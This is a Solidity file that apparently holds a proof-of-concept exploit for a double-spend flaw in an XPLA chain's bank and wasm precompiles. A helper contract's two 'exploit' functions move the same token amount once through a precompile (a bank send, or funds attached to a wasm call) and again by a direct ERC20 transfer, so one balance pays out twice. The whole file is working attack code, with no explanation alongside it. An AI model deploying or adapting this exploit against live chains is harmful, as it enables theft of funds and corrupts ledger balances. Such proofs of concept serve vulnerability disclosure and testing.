// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Coin} from "cosmos-evm-contracts/precompiles/common/Types.sol";
import {IBank, BANK_PRECOMPILE_ADDRESS} from "../xpla/bank/IBank.sol";
import {IWasm, WASM_PRECOMPILE_ADDRESS} from "../xpla/wasm/IWasm.sol";

contract PoCToken is ERC20 {
    constructor(uint256 supply) ERC20("PoC Token", "POC") {
        _mint(msg.sender, supply);
    }
}

contract BankXerc20DoubleSpendPoC {
    IBank private constant BANK = IBank(BANK_PRECOMPILE_ADDRESS);
    IWasm private constant WASM = IWasm(WASM_PRECOMPILE_ADDRESS);

    IERC20 public immutable token;
    string public denom;

    constructor(IERC20 token_, string memory denom_) {
        token = token_;
        denom = denom_;
    }

    function exploit(
        address bankRecipient,
        address directRecipient,
        uint256 amount
    ) external {
        require(token.balanceOf(address(this)) >= amount, "insufficient seed");

        Coin[] memory coins = new Coin[](1);
        coins[0] = Coin({denom: denom, amount: amount});

        require(
            BANK.send(address(this), bankRecipient, coins),
            "bank send failed"
        );
        require(token.transfer(directRecipient, amount), "transfer failed");
    }

    function exploitViaWasmFunds(
        address wasmContract,
        bytes calldata wasmMsg,
        address directRecipient,
        uint256 amount
    ) external {
        require(token.balanceOf(address(this)) >= amount, "insufficient seed");

        Coin[] memory funds = new Coin[](1);
        funds[0] = Coin({denom: denom, amount: amount});

        WASM.executeContract(address(this), wasmContract, wasmMsg, funds);
        require(token.transfer(directRecipient, amount), "transfer failed");
    }
}
